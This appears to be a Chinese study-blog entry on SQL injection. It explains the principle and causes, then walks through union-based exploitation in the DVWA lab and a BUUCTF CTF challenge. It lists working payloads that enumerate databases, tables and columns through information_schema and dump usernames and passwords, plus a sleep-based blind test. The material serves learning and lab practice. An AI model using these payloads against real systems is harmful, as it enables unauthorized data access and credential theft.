title="明日学习计划"></a><strong>明日学习计划</strong></h3><ol><li>深入学习XSS漏洞原理与防御。</li><li>搭建本地测试环境（DVWA靶场）。</li><li>了解SQL注入的分类与利用方法。</li></ol><ul><li>前言：SQL注入（SQL Injection）是一种常见的攻击手段，攻击者通过在输入字段中插入恶意SQL代码，来操控数据库，从而获取敏感信息、篡改数据，甚至摧毁数据库。本次实验包括数字型注入和字符型注入，是SQL注入攻击中最基础且最常见的形式。通过联合查询（Union Query）合并多个SQL查询结果来获取未授权数据。</li></ul><h1 id="一、Sql注入原理"><a href="#一、Sql注入原理" class="headerlink" title="一、Sql注入原理"></a>一、Sql注入原理</h1><p>SQL 注入就是指 Web  应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><h1 id="二、Sql注入产生原因"><a href="#二、Sql注入产生原因" class="headerlink" title="二、Sql注入产生原因"></a>二、Sql注入产生原因</h1><ul><li>传递给后端的<code>参数是可以控制的</code></li><li><code>参数内容会被带入到数据库查询</code></li><li>变量未存在过滤或者过滤不严谨</li></ul><h1 id="三、SQL探测"><a href="#三、SQL探测" class="headerlink" title="三、SQL探测"></a>三、SQL探测</h1><h2 id="一．探测sql注入的存在"><a href="#一．探测sql注入的存在" class="headerlink" title="一．探测sql注入的存在"></a>一．探测sql注入的存在</h2><p>sql注入第一个前置条件</p><ol><li>用户输入的参数是可以控制的 id</li><li>用户的输入id 用单引号进行包裹的 sql语句我们是可以操控–&gt; 这个功能点存在sql注入漏洞</li></ol><p>单双引号去判断 sql注入payload 二开burp的插件</p><p>xiazhu 查看去自动化实现sql注入的探测</p><p>证明sql语句能够成立 and or</p><p>sql注入漏洞利用 -&gt; 能注入出数据</p><p>select  union 联合查询</p><p>页面有sql报错 并且页面有回显</p><p>web漏洞 -&gt; sql注入 -&gt; 联合注入&#x2F;报错注入&#x2F;盲注&#x2F;二次注入&#x2F;堆叠注入&#x2F;宽字节注入…</p><h2 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h2><p>第一步 爆回显位</p><p>-1’ union select 1,2,3–+</p><p>第二步 爆当前的库名</p><p>-1’ union select 1,2,database()–+</p><p>第三步 爆表名</p><p>-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+</p><p>第四步 爆列名</p><p>第五步 爆数据</p><p>sql注入利用完成 -&gt; 完整的利用链</p><p>爆出users表下的所有数据</p><h1 id="四、测试"><a href="#四、测试" class="headerlink" title="四、测试"></a>四、测试</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>1’ and ‘1’&#x3D;’1<br>1’ or sleep(5)#<br>联合注入<br>1’ order by 5 #<br>1’ union select 1,2 #<br>1’ union select 1,database() #<br>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’#<br>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ #<br>1’ union select user,password from users #</p><h2 id="BUUCTF的lovesql题目"><a href="#BUUCTF的lovesql题目" class="headerlink" title="BUUCTF的lovesql题目"></a>BUUCTF的lovesql题目</h2><p>1.登录测试sql语句</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325134343318.png" alt="image-20250325134336217"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250325134354153.png" alt="image-20250325134354097"></p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>SQL注入作为一种经典的Web应用漏洞，依然是攻击者攻击网站和应用程序的常用手段。因此，掌握SQL注入的攻击方法和防护措施显得尤为重要。此外，参加CTF竞赛如BuuCTF中的Lovesql题目，使我对SQL注入有了更深入的了解和实战经验，也锻炼了我们的漏洞挖掘能力。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
